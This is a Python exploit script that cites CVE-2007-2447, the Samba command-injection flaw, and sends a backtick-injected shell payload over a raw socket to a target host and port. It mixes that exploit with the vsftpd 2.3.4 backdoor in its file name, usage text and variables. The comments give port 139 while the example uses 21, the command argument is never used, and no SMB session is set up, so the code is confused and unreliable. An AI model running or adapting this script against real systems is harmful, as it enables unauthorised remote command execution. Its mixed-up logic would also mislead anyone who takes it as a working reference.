#!/usr/bin/python3
import socket
import sys
import time

"""
CVE-2007-2447
https://www.cvedetails.com/cve/CVE-2007-2447/

https://www.exploit-db.com/exploits/16320
"""

"""
Usually port: 139
"""
PAYLOAD = b"echo kcSRUHFk7QrMfD6X;"
EXPLOIT = b'/=`nohup '+ PAYLOAD + b'`'


def exploit(ip, port, command):

    try:
        print('[*] Attempting to trigger backdoor...')
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.connect((ip, port))
        print('[+] Sending exploit')
        # Attempt to login to trigger backdoor
        ftp_socket.send(EXPLOIT)
        #ftp_socket.send(b'PASS please\n')
        time.sleep(2)
        print('[+] Waiting for response')
        response = ftp_socket.recv(32).decode('utf-8')
        print('[+] RESPONSE: %s', response)
        ftp_socket.close()
        print('[+] Triggered backdoor')

    except Exception:
        print('[!] Failed to trigger backdoor on %s' % ip)


if __name__ == '__main__':

    if len(sys.argv) < 4:
        print('Usage: ./vsftpd_234_exploit.py <IP address> <port> <command>')
        print('Example: ./vsftpd_234_exploit.py 192.168.1.10 21 whoami')

    else:
        exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3])